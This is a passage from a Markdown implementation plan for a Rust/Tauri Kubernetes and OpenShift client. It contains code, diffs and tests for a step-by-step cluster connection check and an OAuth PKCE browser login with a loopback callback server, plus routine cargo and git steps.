        (g.routes, "Route"),
        (g.projects, "Project"),
        (g.deployment_configs, "DeploymentConfig"),
        (g.gateway_api, "Gateway API"),
    ]
    .into_iter()
    .filter_map(|(has, name)| has.then_some(name))
    .collect();
    if found.is_empty() {
        ltext!(
            "messages.connectionTest.discovery",
            "{{platform}} · API server {{version}}",
            platform = d.platform.label,
            version = d.server_version
        )
    } else {
        ltext!(
            "messages.connectionTest.discoveryGroups",
            "{{platform}} · API server {{version}} · found: {{groups}}",
            platform = d.platform.label,
            version = d.server_version,
            groups = found.join(", ")
        )
    }
}

/// Шаги после TCP на готовом клиенте: TLS и вход (одним запросом «кто я»), discovery, проекты.
pub async fn check_cluster(
    steps: &mut Vec<TestStep>,
    client: &kube::Client,
    p: &ConnectionProfile,
) -> bool {
    let limit = request_timeout(p);
    let tls_ok = if p.ca == CaConfig::Insecure {
        ltext!(
            "messages.connectionTest.tlsInsecure",
            "The server certificate is NOT verified (insecure mode)"
        )
    } else {
        ltext!(
            "messages.connectionTest.tlsOk",
            "The server certificate is trusted"
        )
    };
    match whoami(client, limit).await {
        Ok((user, _)) => {
            steps.push(passed("tls", tls_ok));
            steps.push(passed(
                "auth",
                ltext!(
                    "messages.connectionTest.authOk",
                    "Signed in as {{user}}",
                    user = user
                ),
            ));
        }
        Err(e) if matches!(e.code, ErrorCode::SessionExpired | ErrorCode::AuthFailed) => {
            steps.push(passed("tls", tls_ok));
            steps.push(failed_step("auth", e));
            return false;
        }
        Err(e) => {
            steps.push(failed_step("tls", e));
            return false;
        }
    }
    let projects_api = match discover(client, limit).await {
        Ok(d) => {
            steps.push(passed("discovery", discovery_message(&d)));
            d.api_groups.projects
        }
        Err(e) => {
            steps.push(failed_step("discovery", e));
            return false;
        }
    };
    match list_project_names(client, limit, projects_api).await {
        Ok((names, more)) => {
            let count = if more {
                format!("{}+", names.len())
            } else {
                names.len().to_string()
            };
            steps.push(passed(
                "projects",
                ltext!(
                    "messages.connectionTest.projectsOk",
                    "Available projects: {{count}}",
                    count = count
                ),
            ));
            true
        }
        Err(e) if e.code == ErrorCode::Forbidden && !p.manual_namespaces.is_empty() => {
            steps.push(passed(
                "projects",
                ltext!(
                    "messages.connectionTest.projectsManual",
                    "The cluster does not list projects for you; projects from the profile: {{count}}",
                    count = p.manual_namespaces.len()
                ),
            ));
            true
        }
        Err(e) => {
            steps.push(failed_step("projects", e));
            false
        }
    }
}

/// Проверяет и несохранённый профиль: секреты берутся из `secrets` (поверх keychain — форма).
pub async fn test_connection(
    p: &ConnectionProfile,
    secrets: Arc<dyn SecretStore>,
    policy: &PolicyStatus,
) -> TestReport {
    let mut steps = Vec::new();
    let profile = p.clone();
    let config = match ensure_allowed(p, policy) {
        Err(e) => Err(e),
        Ok(()) => tokio::task::spawn_blocking(move || {
            crate::storage::profile::validate_profile(&profile)?;
            build_kube_config(&profile, secrets.as_ref(), &process_env)
        })
        .await
        .unwrap_or_else(|e| Err(AppError::internal_with(e.to_string()))),
    };
    let config = match config {
        Ok(c) => c,
        Err(e) => return report(vec![failed_step("config", e)]),
    };
    steps.push(passed(
        "config",
        ltext!("messages.connectionTest.configOk", "Configuration is valid"),
    ));

    let (host, port, via_proxy) = tcp_target(&config);
    let connect_limit = Duration::from_millis(p.connect_timeout_ms);
    match tcp_probe(&host, port, connect_limit).await {
        Ok(address) if via_proxy => steps.push(passed(
            "tcp",
            ltext!(
                "messages.connectionTest.tcpProxyOk",
                "TCP connection to the proxy {{address}} established",
                address = address
            ),
        )),
        Ok(address) => steps.push(passed(
            "tcp",
            ltext!(
                "messages.connectionTest.tcpOk",
                "TCP connection to {{address}} established",
                address = address
            ),
        )),
        Err(e) => {
            steps.push(failed_step("tcp", e));
            return report(steps);
        }
    }

    let client = match kube::Client::try_from(config) {
        Ok(c) => c,
        Err(e) => {
            steps.push(failed_step("tls", from_kube(&e)));
            return report(steps);
        }
    };
    check_cluster(&mut steps, &client, p).await;
    report(steps)
}

fn report(steps: Vec<TestStep>) -> TestReport {
    TestReport {
        ok: steps.iter().all(|s| s.ok),
        steps,
    }
}
````

<!-- block: patch t07-src step=7.2 -->
````diff
diff --git a/src-tauri/src/k8s/cluster.rs b/src-tauri/src/k8s/cluster.rs
--- a/src-tauri/src/k8s/cluster.rs
+++ b/src-tauri/src/k8s/cluster.rs
@@ -8,7 +8,7 @@ use k8s_openapi::api::authentication::v1::SelfSubjectReview;
 use k8s_openapi::api::authorization::v1::{
     ResourceAttributes, SelfSubjectAccessReview, SelfSubjectAccessReviewSpec,
 };
-use k8s_openapi::api::core::v1::Node;
+use k8s_openapi::api::core::v1::{Namespace, Node};
 use kube::api::{Api, ApiResource, DynamicObject, GroupVersionKind, ListParams, PostParams};
 use serde::Serialize;
 
@@ -225,6 +225,44 @@ pub async fn capabilities(client: &kube::Client, limit: Duration, d: &Discovered
     }
 }
 
+/// Имена проектов (`projects`, если есть группа `project.openshift.io`, иначе `namespaces`):
+/// первые 500 и признак «есть ещё».
+pub async fn list_project_names(
+    client: &kube::Client,
+    limit: Duration,
+    projects_api: bool,
+) -> AppResult<(Vec<String>, bool)> {
+    let params = ListParams::default().limit(500);
+    let list = if projects_api {
+        let ar = ApiResource::from_gvk_with_plural(
+            &GroupVersionKind::gvk("project.openshift.io", "v1", "Project"),
+            "projects",
+        );
+        let api: Api<DynamicObject> = Api::all_with(client.clone(), &ar);
+        let l = timed(limit, api.list(&params)).await?;
+        let more = l.metadata.continue_.is_some_and(|c| !c.is_empty());
+        (
+            l.items
+                .into_iter()
+                .filter_map(|p| p.metadata.name)
+                .collect(),
+            more,
+        )
+    } else {
+        let api: Api<Namespace> = Api::all(client.clone());
+        let l = timed(limit, api.list(&params)).await?;
+        let more = l.metadata.continue_.is_some_and(|c| !c.is_empty());
+        (
+            l.items
+                .into_iter()
+                .filter_map(|n| n.metadata.name)
+                .collect(),
+            more,
+        )
+    };
+    Ok(list)
+}
+
 /// Всё, что Glafira узнаёт при подключении. Первая ошибка («кто я», discovery) прерывает
 /// подключение; ошибки проверок прав дают «нет права».
 pub async fn probe(client: &kube::Client, limit: Duration) -> AppResult<ConnectionInfo> {
@@ -276,6 +314,14 @@ pub(crate) mod fixtures {
                 "Forbidden",
                 r#"clusterversions.config.openshift.io "version" is forbidden: User "dev1" cannot get resource "clusterversions" in API group "config.openshift.io" at the cluster scope"#,
             ),
+            "/apis/project.openshift.io/v1/projects" => (
+                200,
+                serde_json::json!({"apiVersion": "project.openshift.io/v1", "kind": "ProjectList",
+                "metadata": {}, "items": [
+                    {"apiVersion": "project.openshift.io/v1", "kind": "Project", "metadata": {"name": "team-a"}},
+                    {"apiVersion": "project.openshift.io/v1", "kind": "Project", "metadata": {"name": "team-b"}}
+                ]}),
+            ),
             "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" => {
                 let attrs = &s.body["spec"]["resourceAttributes"];
                 let allowed = matches!(attrs["resource"].as_str(), Some("projects" | "pods"));
@@ -445,6 +491,29 @@ mod tests {
         assert_eq!(info.capabilities, Capabilities::default());
     }
 
+    #[tokio::test]
+    async fn project_names_of_openshift_and_kubernetes() {
+        let (client, server) = mock_client(|s| match s.path() {
+            "/api/v1/namespaces" => (
+                200,
+                serde_json::json!({"apiVersion": "v1", "kind": "NamespaceList",
+                    "metadata": {"continue": "token"},
+                    "items": [{"metadata": {"name": "default"}}]}),
+            ),
+            _ => fixtures::openshift(s),
+        });
+        let (names, more) = list_project_names(&client, LIMIT, true).await.unwrap();
+        assert_eq!(
+            (names, more),
+            (vec!["team-a".to_string(), "team-b".to_string()], false)
+        );
+        let (names, more) = list_project_names(&client, LIMIT, false).await.unwrap();
+        assert_eq!((names, more), (vec!["default".to_string()], true));
+        drop(client);
+        let seen = server.await.unwrap();
+        assert!(seen.iter().all(|s| s.uri.contains("limit=500")));
+    }
+
     #[tokio::test(start_paused = true)]
     async fn slow_server_times_out() {
         let fut = async {
diff --git a/src-tauri/src/k8s/mod.rs b/src-tauri/src/k8s/mod.rs
--- a/src-tauri/src/k8s/mod.rs
+++ b/src-tauri/src/k8s/mod.rs
@@ -2,6 +2,7 @@
 
 pub mod cluster;
 pub mod config;
+pub mod connectivity;
 pub mod errors;
 pub mod pool;
 #[cfg(test)]
````

Применить: `python3 /tmp/o1a-blocks.py step 7.2`.

- [ ] **Step 3: Проверки.**

Run: `cargo test --manifest-path src-tauri/Cargo.toml --lib`  
Expected: PASS — `test result: ok. 131 passed; 0 failed`

Run: `cargo clippy --manifest-path src-tauri/Cargo.toml --all-targets -- -D warnings`  
Expected: PASS — без предупреждений

Run: `cargo fmt --manifest-path src-tauri/Cargo.toml --check`  
Expected: PASS — без изменений

- [ ] **Step 4: Commit.**

```bash
git add -A
git commit -s -m "feat(k8s): пошаговая проверка подключения — конфигурация, TCP, TLS, вход, discovery, проекты" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

### Task 8: Вход через браузер в OAuth OpenShift

**Files:**
- Create: `src-tauri/src/auth/callback.rs`, `src-tauri/src/auth/mod.rs`, `src-tauri/src/auth/oauth.rs`, `src-tauri/src/auth/pkce.rs`, `src-tauri/src/tls.rs`
- Modify: `src-tauri/Cargo.toml`, `src-tauri/src/lib.rs`

**Interfaces:**
- Consumes: задачи 4–5.
- Produces: `tls::ensure_crypto_provider()`; `auth::pkce::{Pkce { verifier, challenge }, challenge_for, random_token, generate}`; `auth::callback::{Callback::{Code, Denied, Other}, parse_request_line, CallbackServer::{bind, wait(state, limit, cancel)}, CallbackServer.redirect_uri, cancelled}`; `auth::oauth::{CLIENT_ID, LOGIN_TIMEOUT, OAuthMetadata { issuer, authorization_endpoint, token_endpoint }, http_client(&ConnectionProfile) -> AppResult<reqwest::Client>, fetch_metadata, authorize_url, token_request_page, exchange_code, login(&ConnectionProfile, open_browser, cancel, limit) -> AppResult<String>}`.

Спец. §5.2. Как `oc login --web`: метаданные `GET <API>/.well-known/oauth-authorization-server` (путь адреса API сохраняется), loopback-сервер на `127.0.0.1:<случайный порт>/callback`, Authorization Code + PKCE (S256) с клиентом `openshift-cli-client`, обмен кода на токен; ожидание до 5 мин, отмена — через `oneshot`. У кластера без OAuth-сервера OpenShift (обычный Kubernetes) способ в форме доступен, но вход завершается `AUTH_FAILED` с подсказкой: токен, контекст kubeconfig или exec-плагин. HTTP-клиент — `reqwest` 0.13 с `rustls-no-provider`: провайдер ring ставится явно (`tls::ensure_crypto_provider`), иначе rustls получил бы два провайдера (aws-lc-rs из `reqwest` и ring из `kube`). CA профиля здесь добавляется к системным корням: сертификат OAuth-сервера часто выпущен CA ingress. Страница после входа — по-английски: кириллица в строковых литералах Rust запрещена проверкой `i18n:check`. Страница «Display Token» (`/oauth/token/request`) — запасной путь.

- [ ] **Step 1: Тесты.**

<!-- block: file t08-src-tauri-src-auth-callback-rs-tests step=8.1 path=src-tauri/src/auth/callback.rs part=tests -->
````rust
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn request_lines() {
        assert_eq!(
            parse_request_line("GET /callback?code=abc%2F1&state=s1 HTTP/1.1"),
            Callback::Code {
                code: "abc/1".into(),
                state: "s1".into()
            }
        );
        assert_eq!(
            parse_request_line("GET /callback?error=access_denied&state=s HTTP/1.1"),
            Callback::Denied {
                error: "access_denied".into()
            }
        );
        assert_eq!(
            parse_request_line("GET /favicon.ico HTTP/1.1"),
            Callback::Other
        );
        assert_eq!(
            parse_request_line("POST /callback HTTP/1.1"),
            Callback::Other
        );
        assert_eq!(
            parse_request_line("GET /callback HTTP/1.1"),
            Callback::Denied {
                error: "missing code".into()
            }
        );
    }

    async fn get(url: &str) -> (u16, String) {
        crate::tls::ensure_crypto_provider();
        let r = reqwest::Client::new().get(url).send().await.unwrap();
        (r.status().as_u16(), r.text().await.unwrap())
    }

    #[tokio::test]
    async fn returns_code_after_ignoring_other_paths() {
        let server = CallbackServer::bind().await.unwrap();
        let base = server.redirect_uri.replace("/callback", "");
        assert!(server.redirect_uri.starts_with("http://127.0.0.1:"));
        let (_tx, rx) = oneshot::channel();
        let wait =
            tokio::spawn(async move { server.wait("s1", Duration::from_secs(10), rx).await });
        let (code, _) = get(&format!("{base}/favicon.ico")).await;
        assert_eq!(code, 404);
        let (code, page) = get(&format!("{base}/callback?code=c-1&state=s1")).await;
        assert_eq!(code, 200);
        assert!(page.contains("Signed in"));
        assert_eq!(wait.await.unwrap().unwrap(), "c-1");
    }

    #[tokio::test]
    async fn wrong_state_and_denial_are_errors() {
        for (query, key) in [
            ("code=c&state=other", "errors.oauth.stateMismatch"),
            ("error=access_denied", "errors.oauth.denied"),
        ] {
            let server = CallbackServer::bind().await.unwrap();
            let url = format!("{}?{query}", server.redirect_uri);
            let (_tx, rx) = oneshot::channel();
            let wait =
                tokio::spawn(async move { server.wait("s1", Duration::from_secs(10), rx).await });
            let (_, page) = get(&url).await;
            assert!(page.contains("Sign-in failed"));
            assert_eq!(wait.await.unwrap().unwrap_err().key, key);
        }
    }

    #[tokio::test]
    async fn cancel_and_timeout() {
        let server = CallbackServer::bind().await.unwrap();
        let (tx, rx) = oneshot::channel();
        let wait = tokio::spawn(async move { server.wait("s", Duration::from_secs(10), rx).await });
        tx.send(()).unwrap();
        assert_eq!(
            wait.await.unwrap().unwrap_err().key,
            "errors.oauth.cancelled"
        );

        let server = CallbackServer::bind().await.unwrap();
        let (_tx, rx) = oneshot::channel();
        let e = server
            .wait("s", Duration::from_millis(50), rx)
            .await
            .unwrap_err();
        assert_eq!(e.key, "errors.oauth.timeout");
    }
}
````

<!-- block: file t08-src-tauri-src-auth-oauth-rs-tests step=8.1 path=src-tauri/src/auth/oauth.rs part=tests -->
````rust
#[cfg(test)]
mod tests {
    use std::sync::{Arc, Mutex};

    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    use super::*;
    use crate::storage::profile::sample_profile;

    /// Простой HTTP-сервер для тестов: отвечает `routes(метод, путь, тело)`; записывает запросы.
    async fn fake_server(
        routes: impl Fn(&str, &str, &str) -> (u16, String) + Send + Sync + 'static,
    ) -> (String, Arc<Mutex<Vec<String>>>) {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let base = format!("http://{}", listener.local_addr().unwrap());
        let log = Arc::new(Mutex::new(Vec::new()));
        let (routes, log2) = (Arc::new(routes), log.clone());
        tokio::spawn(async move {
            loop {
                let Ok((mut s, _)) = listener.accept().await else {
                    return;
                };
                let (routes, log) = (routes.clone(), log2.clone());
                tokio::spawn(async move {
                    let mut buf = Vec::new();
                    let mut chunk = [0u8; 4096];
                    loop {
                        let n = s.read(&mut chunk).await.unwrap();
                        if n == 0 {
                            return;
                        }
                        buf.extend_from_slice(&chunk[..n]);
                        let text = String::from_utf8_lossy(&buf).to_string();
                        if let Some(end) = text.find("\r\n\r\n") {
                            let len = text[..end]
                                .lines()
                                .find_map(|l| {
                                    l.to_ascii_lowercase()
                                        .strip_prefix("content-length:")
                                        .map(|v| v.trim().parse::<usize>().unwrap())
                                })
                                .unwrap_or(0);
                            if buf.len() >= end + 4 + len {
                                let mut first = text.lines().next().unwrap().split(' ');
                                let (method, path) = (first.next().unwrap(), first.next().unwrap());
                                let body = &text[end + 4..end + 4 + len];
                                log.lock().unwrap().push(format!("{method} {path} {body}"));
                                let (code, json) = routes(method, path, body);
                                let resp = format!(
                                    "HTTP/1.1 {code} X\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{json}",
                                    json.len()
                                );
                                s.write_all(resp.as_bytes()).await.unwrap();
                                return;
                            }
                        }
                    }
                });
            }
        });
        (base, log)
    }

    fn meta(base: &str) -> OAuthMetadata {
        OAuthMetadata {
            issuer: base.into(),
            authorization_endpoint: format!("{base}/oauth/authorize"),
            token_endpoint: format!("{base}/oauth/token"),
        }
    }

    #[test]
    fn authorize_url_has_pkce_and_loopback_redirect() {
        let url = authorize_url(
            &meta("https://oauth-openshift.apps.c"),
            "http://127.0.0.1:5000/callback",
            "CH",
            "ST",
        );
        let parsed = url::Url::parse(&url).unwrap();
        assert_eq!(parsed.path(), "/oauth/authorize");
        let q: std::collections::HashMap<_, _> = parsed.query_pairs().into_owned().collect();
        assert_eq!(q["client_id"], "openshift-cli-client");
        assert_eq!(q["response_type"], "code");
        assert_eq!(q["redirect_uri"], "http://127.0.0.1:5000/callback");
        assert_eq!(q["code_challenge"], "CH");
        assert_eq!(q["code_challenge_method"], "S256");
        assert_eq!(q["state"], "ST");
        assert_eq!(
            token_request_page(&meta("https://oauth-openshift.apps.c/")),
            "https://oauth-openshift.apps.c/oauth/token/request"
        );
    }

    #[tokio::test]
    async fn metadata_and_its_absence() {
        let (base, _) = fake_server(|_, path, _| match path {
            "/.well-known/oauth-authorization-server" => (
                200,
                r#"{"issuer":"https://o","authorization_endpoint":"https://o/oauth/authorize","token_endpoint":"https://o/oauth/token","scopes_supported":["user:full"]}"#.into(),
            ),
            _ => (404, "{}".into()),
        })
        .await;
        let http = http_client(&sample_profile("a")).unwrap();
        let m = fetch_metadata(&http, &format!("{base}/")).await.unwrap();
        assert_eq!(m.token_endpoint, "https://o/oauth/token");
        let (base, log) = fake_server(|_, _, _| (404, "{}".into())).await;
        let e = fetch_metadata(&http, &format!("{base}/k8s/clusters/c-1"))
            .await
            .unwrap_err();
        assert_eq!(
            (e.code, e.key.as_str()),
            (ErrorCode::AuthFailed, "errors.oauth.notAvailable")
        );
        assert_eq!(
            log.lock().unwrap()[0],
            "GET /k8s/clusters/c-1/.well-known/oauth-authorization-server ",
            "адрес API с путём"
        );
    }

    #[tokio::test]
    async fn code_exchange_success_and_rejection() {
        let (base, log) = fake_server(|_, _, body| {
            if body.contains("code=good") {
                (
                    200,
                    r#"{"access_token":"sha256~tok","token_type":"Bearer","expires_in":86400}"#
                        .into(),
                )
            } else {
                (
                    400,
                    r#"{"error":"invalid_grant","error_description":"code expired"}"#.into(),
                )
            }
        })
        .await;
        let http = http_client(&sample_profile("a")).unwrap();
        let t = exchange_code(
            &http,
            &meta(&base),
            "good",
            "VER",
            "http://127.0.0.1:1/callback",
        )
        .await
        .unwrap();
        assert_eq!(t, "sha256~tok");
        let req = log.lock().unwrap()[0].clone();
        assert!(req.starts_with("POST /oauth/token "));
        for part in [
            "grant_type=authorization_code",
            "client_id=openshift-cli-client",
            "code_verifier=VER",
            "redirect_uri=http%3A%2F%2F127.0.0.1%3A1%2Fcallback",
        ] {
            assert!(req.contains(part), "{part} in {req}");
        }
        let e = exchange_code(&http, &meta(&base), "bad", "V", "r")
            .await
            .unwrap_err();
        assert_eq!(e.key, "errors.oauth.rejected");
        assert_eq!(e.params["reason"], "code expired");
    }

    #[tokio::test]
    async fn full_login_through_fake_oauth_server() {
        let (base, _) = fake_server(move |method, path, body| match (method, path) {
            ("POST", "/oauth/token") if body.contains("code=the-code") => {
                (200, r#"{"access_token":"sha256~new"}"#.into())
            }
            _ => (404, "{}".into()),
        })
        .await;
        // Метаданные указывают на тот же фейковый сервер.
        let (meta_base, _) = {
            let b = base.clone();
            fake_server(move |_, _, _| {
                (
                    200,
                    serde_json::json!({"issuer": b, "authorization_endpoint": format!("{b}/oauth/authorize"),
                        "token_endpoint": format!("{b}/oauth/token")})
                    .to_string(),
                )
            })
            .await
        };
        let mut p = sample_profile("a");
        p.api_url = meta_base;
        let (_tx, rx) = tokio::sync::oneshot::channel();
        // «Браузер»: сразу проходит redirect с кодом и тем же state.
        let browser = |url: &str| {
            let u = url::Url::parse(url).unwrap();
            let q: std::collections::HashMap<_, _> = u.query_pairs().into_owned().collect();
            let callback = format!("{}?code=the-code&state={}", q["redirect_uri"], q["state"]);
            tokio::spawn(async move {
                reqwest::Client::new().get(callback).send().await.unwrap();
            });
            Ok(())
        };
        let token = login(&p, browser, rx, Duration::from_secs(10))
            .await
            .unwrap();
        assert_eq!(token, "sha256~new");
    }

    #[tokio::test]
    async fn bad_proxy_and_ca_are_input_errors() {
        let mut p = sample_profile("a");
        p.proxy = ProxyConfig::Url { url: "::".into() };
        assert_eq!(
            http_client(&p).unwrap_err().key,
            "errors.connections.badProxyUrl"
        );
        let mut p = sample_profile("a");
        p.ca = CaConfig::Pem { pem: "nope".into() };
        assert_eq!(
            http_client(&p).unwrap_err().key,
            "errors.connections.caPemInvalid"
        );
        let mut p = sample_profile("a");
        p.ca = CaConfig::Pem {
            pem: crate::storage::profile::TEST_CERT_PEM.into(),
        };
        assert!(http_client(&p).is_ok());
    }
}
````

<!-- block: file t08-src-tauri-src-auth-pkce-rs-tests step=8.1 path=src-tauri/src/auth/pkce.rs part=tests -->
````rust
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn rfc7636_appendix_b_vector() {
        assert_eq!(
            challenge_for("dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"),
            "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM"
        );
    }

    #[test]
    fn generated_values_are_unique_and_url_safe() {
        let a = generate().unwrap();
        let b = generate().unwrap();
        assert_ne!(a.verifier, b.verifier);
        assert_eq!(a.verifier.len(), 43);
        assert_eq!(a.challenge, challenge_for(&a.verifier));
        assert!(
            a.verifier
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
        );
    }
}
````

Применить: `python3 /tmp/o1a-blocks.py step 8.1`.

- [ ] **Step 2: Реализация.**

<!-- block: file t08-src-tauri-src-auth-callback-rs-impl step=8.2 path=src-tauri/src/auth/callback.rs part=impl -->
````rust
//! Приём redirect на `http://127.0.0.1:<порт>/callback`: одна страница с кодом авторизации.

use std::time::Duration;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;
use tokio::sync::oneshot;

use crate::error::{AppError, AppResult, ErrorCode};

/// Что пришло в redirect.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Callback {
    Code {
        code: String,
        state: String,
    },
    Denied {
        error: String,
    },
    /// Другой путь (например, `/favicon.ico`) — ждём дальше.
    Other,
}

/// Разбирает первую строку HTTP-запроса: `GET /callback?code=…&state=… HTTP/1.1`.
pub fn parse_request_line(line: &str) -> Callback {
    let mut parts = line.split_whitespace();
    let (Some("GET"), Some(target)) = (parts.next(), parts.next()) else {
        return Callback::Other;
    };
    let (path, query) = target.split_once('?').unwrap_or((target, ""));
    if path != "/callback" {
        return Callback::Other;
    }
    let mut code = None;
    let mut state = None;
    let mut error = None;
    for (k, v) in url::form_urlencoded::parse(query.as_bytes()) {
        match k.as_ref() {
            "code" => code = Some(v.into_owned()),
            "state" => state = Some(v.into_owned()),
            "error" => error = Some(v.into_owned()),
            _ => {}
        }
    }
    match (error, code) {
        (Some(error), _) => Callback::Denied { error },
        (None, Some(code)) => Callback::Code {
            code,
            state: state.unwrap_or_default(),
        },
        (None, None) => Callback::Denied {
            error: "missing code".into(),
        },
    }
}

// Страница видна в браузере до возврата в Glafira; текст — по-английски, как у `oc login --web`.
const PAGE: &str = "<!doctype html><html><head><meta charset=\"utf-8\"><title>Glafira</title></head>\
<body style=\"font-family:sans-serif;padding:32px\"><h2>Glafira for Kubernetes</h2>\
<p>Signed in — return to Glafira. You can close this tab.</p></body></html>";

const DENIED_PAGE: &str = "<!doctype html><html><head><meta charset=\"utf-8\"><title>Glafira</title></head>\
<body style=\"font-family:sans-serif;padding:32px\"><h2>Glafira for Kubernetes</h2>\
<p>Sign-in failed — see the Glafira window for details.</p></body></html>";

pub struct CallbackServer {
    listener: TcpListener,
    pub redirect_uri: String,
}

impl CallbackServer {
    /// Слушает случайный порт только на 127.0.0.1.
    pub async fn bind() -> AppResult<Self> {
        let listener = TcpListener::bind("127.0.0.1:0").await?;
        let port = listener.local_addr()?.port();
        Ok(Self {
            listener,
            redirect_uri: format!("http://127.0.0.1:{port}/callback"),
        })
    }

    /// Ждёт redirect с `expected_state` не дольше `limit`; `cancel` прерывает ожидание.
    pub async fn wait(
        self,
        expected_state: &str,
        limit: Duration,
        cancel: oneshot::Receiver<()>,
    ) -> AppResult<String> {
        let accept = async {
            loop {
                let (mut stream, _) = self.listener.accept().await?;
                let mut buf = vec![0u8; 8192];
                let mut len = 0;
                // Достаточно первой строки; ждём конец заголовков, но не больше 8 КБ.
                while len < buf.len() {
                    let n = stream.read(&mut buf[len..]).await?;
                    if n == 0 {
                        break;
                    }
                    len += n;
                    if buf[..len].windows(4).any(|w| w == b"\r\n\r\n") {
                        break;
                    }
                }
                let head = String::from_utf8_lossy(&buf[..len]);
                let line = head.lines().next().unwrap_or("");
                let (status, page, result) = match parse_request_line(line) {
                    Callback::Other => ("404 Not Found", "", None),
                    Callback::Denied { error } => (
                        "200 OK",
                        DENIED_PAGE,
                        Some(Err(app_err!(
                            ErrorCode::AuthFailed,
                            "errors.oauth.denied",
                            "Sign-in was not completed: {{error}}",
                            error = error
                        ))),
                    ),
                    Callback::Code { state, .. } if state != expected_state => (
                        "200 OK",
                        DENIED_PAGE,
                        Some(Err(app_err!(
                            ErrorCode::AuthFailed,
                            "errors.oauth.stateMismatch",
                            "The sign-in response does not match the request — try again"
                        ))),
                    ),
                    Callback::Code { code, .. } => ("200 OK", PAGE, Some(Ok(code))),
                };
                let response = format!(
                    "HTTP/1.1 {status}\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{page}",
                    page.len()
                );
                let _ = stream.write_all(response.as_bytes()).await;
                let _ = stream.shutdown().await;
                if let Some(r) = result {
                    return r;
                }
            }
        };
        tokio::select! {
            r = accept => r,
            _ = cancel => Err(cancelled()),
            _ = tokio::time::sleep(limit) => Err(app_err!(
                ErrorCode::Timeout,
                "errors.oauth.timeout",
                "Sign-in in the browser was not completed in time"
            )),
        }
    }
}

pub fn cancelled() -> AppError {
    app_err!(
        ErrorCode::AuthFailed,
        "errors.oauth.cancelled",
        "Sign-in was cancelled"
    )
}
````

<!-- block: file t08-src-tauri-src-auth-mod-rs step=8.2 path=src-tauri/src/auth/mod.rs -->
````rust
//! Вход через браузер в OAuth OpenShift (спец. §5.2): Authorization Code + PKCE, как `oc login --web`.

pub mod callback;
pub mod oauth;
pub mod pkce;
````

<!-- block: file t08-src-tauri-src-auth-oauth-rs-impl step=8.2 path=src-tauri/src/auth/oauth.rs part=impl -->
````rust
//! OAuth-сервер OpenShift: метаданные, адрес авторизации, обмен кода на токен, страница токена.

use std::time::Duration;

use serde::Deserialize;
use tokio::sync::oneshot;

use crate::auth::callback::CallbackServer;
use crate::auth::pkce;
use crate::error::{AppError, AppResult, ErrorCode};
use crate::k8s::errors::{chain_text, from_transport_text, timeout};
use crate::storage::profile::{CaConfig, ConnectionProfile, ProxyConfig, pem_certificates};

/// OAuth-клиент, которым входит `oc login --web`: публичный, с loopback-redirect.
pub const CLIENT_ID: &str = "openshift-cli-client";
/// Сколько ждать входа в браузере.
pub const LOGIN_TIMEOUT: Duration = Duration::from_secs(300);

#[derive(Debug, Clone, Deserialize, PartialEq, Eq)]
pub struct OAuthMetadata {
    pub issuer: String,
    pub authorization_endpoint: String,
    pub token_endpoint: String,
}

fn from_reqwest(e: &reqwest::Error) -> AppError {
    if e.is_timeout() {
        timeout().with_details(chain_text(e))
    } else {
        from_transport_text(&chain_text(e))
    }
}

/// HTTP-клиент к API-серверу и OAuth-серверу с настройками TLS и прокси профиля. Сертификат
/// OAuth-сервера часто выпущен CA ingress, а не CA API-сервера: CA профиля добавляется к
/// системным корням, а не заменяет их.
pub fn http_client(p: &ConnectionProfile) -> AppResult<reqwest::Client> {
    crate::tls::ensure_crypto_provider();
    let mut b = reqwest::Client::builder()
        .connect_timeout(Duration::from_millis(p.connect_timeout_ms))
        .timeout(Duration::from_millis(p.request_timeout_ms))
        .user_agent(concat!("glafira-kubernetes/", env!("CARGO_PKG_VERSION")));
    match &p.ca {
        CaConfig::System => {}
        CaConfig::Pem { pem } => {
            let bad_pem = || {
                app_err!(
                    ErrorCode::InvalidInput,
                    "errors.connections.caPemInvalid",
                    "The CA certificate must be in PEM format (-----BEGIN CERTIFICATE-----)"
                )
            };
            let certs = pem_certificates(pem)
                .map_err(|_| bad_pem())?
                .iter()
                .map(|der| reqwest::Certificate::from_der(der))
                .collect::<Result<Vec<_>, _>>()
                .map_err(|_| bad_pem())?;
            b = b.tls_certs_merge(certs);
        }
        CaConfig::Insecure => b = b.danger_accept_invalid_certs(true),
    }
    b = match &p.proxy {
        ProxyConfig::System => b,
        ProxyConfig::None => b.no_proxy(),
        ProxyConfig::Url { url } => b.proxy(reqwest::Proxy::all(url.trim()).map_err(|_| {
            app_err!(
                ErrorCode::InvalidInput,
                "errors.connections.badProxyUrl",
                "Invalid proxy address “{{url}}”: use http://host:port",
                url = url
            )
        })?),
    };
    b.build()
        .map_err(|e| AppError::internal_with(format!("http client: {}", chain_text(&e))))
}

/// Нет OAuth-сервера OpenShift (обычный Kubernetes, спец. §5.2): способ входа в форме доступен
/// на любой платформе, но вход завершается этой ошибкой с подсказкой.
fn not_available() -> AppError {
    app_err!(
        ErrorCode::AuthFailed,
        "errors.oauth.notAvailable",
        "This cluster has no OpenShift OAuth server, so sign-in via browser is not available — use a token, a kubeconfig context or an exec plugin"
    )
}

/// `GET <API>/.well-known/oauth-authorization-server` — адреса OAuth-сервера кластера.
pub async fn fetch_metadata(http: &reqwest::Client, api_url: &str) -> AppResult<OAuthMetadata> {
    let url = format!(
        "{}/.well-known/oauth-authorization-server",
        api_url.trim_end_matches('/')
    );
    let r = http.get(&url).send().await.map_err(|e| from_reqwest(&e))?;
    if !r.status().is_success() {
        return Err(not_available().with_details(format!("{url}: HTTP {}", r.status())));
    }
    r.json::<OAuthMetadata>()
        .await
        .map_err(|e| not_available().with_details(chain_text(&e)))
}

/// Адрес страницы входа: Authorization Code + PKCE (S256).
